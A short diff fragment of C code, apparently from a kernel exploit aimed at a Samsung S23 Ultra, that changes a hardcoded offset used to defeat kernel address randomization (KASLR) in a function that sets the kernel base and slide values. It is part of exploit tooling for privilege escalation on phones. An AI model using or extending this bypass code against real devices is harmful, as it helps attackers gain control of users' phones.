@@ -1466,7 +1466,7 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
 
 int slide_leak_kernel_base(void) {
     /* HARDCODED BYPASS FOR S23U SIGRETURN TEST */
-    slide_p0_offset = 0x2c00000;
+    slide_p0_offset = 0x2c05080;
     kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
     kaslr_slide = slide_p0_offset;
     kaslr_done = 1;
